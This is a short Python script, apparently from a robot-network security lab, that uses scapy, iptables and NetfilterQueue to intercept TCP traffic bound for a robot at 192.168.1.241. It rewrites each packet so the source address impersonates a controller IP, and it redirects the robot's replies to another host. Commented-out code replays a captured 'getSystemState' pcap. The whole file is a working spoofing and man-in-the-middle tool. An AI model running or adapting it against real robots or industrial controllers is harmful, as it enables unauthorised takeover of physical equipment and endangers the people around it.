#!/usr/bin/python
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import time
"""
#push=rdpcap("../pcaps/fabricate.pcap")
# time.sleep(1.5)

# rdpcap comes from scapy and loads in our pcap file
packets = rdpcap("/home/robot/pcaps/getSystemState.pcap")

# Let's iterate through every packet
for packet in packets:
    print(packet)
    sendp(packet)
    time.sleep(1.5)
# If the an(swer) is a DNSRR, print the name it replied with.
    if isinstance(packet.an, TCP):

        print(packet.an.rrname)"""

# get MAC address
def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

# change src IP address
def changeIP(pkt):
    print pkt
    packet = IP(pkt.get_payload())
    del packet[IP].chksum
    del packet[TCP].chksum
    #packet[Ether].src = controlMAC
    if packet[IP].dst==controlIP:
        packet[IP].dst='192.168.1.24'
    else:
        packet[IP].src = controlIP
    print packet.summary()
    pkt.set_payload(str(packet))
    pkt.accept()


    """if packet[IP].dst==controlIP: #odbieranie
        packet[Ether].dst=get_mac("192.168.1.24")
        packet[IP].dst="192.168.1.24"
        pkt.set_payload(str(packet))
        pkt.accept()"""
    


print "\n[*] Redirect traffic to the NFQUEUE... \n"
os.system("ip link set dev enp0s3 promisc on")
os.system("iptables -A OUTPUT -p tcp -d 192.168.1.241 -j NFQUEUE --queue-num 1")

interface = "enp0s3"
controlIP = "192.168.1.164"
#controlMAC = get_mac(controlIP)
robotIP = "192.168.1.241"
#robotMAC = get_mac(robotIP)


nfqueue = NetfilterQueue()
nfqueue.bind(1, changeIP) 
try:
    print "[*] waiting for data"
    nfqueue.run()
except KeyboardInterrupt:
    nfqueue.unbind()
    os.system("iptables -F")
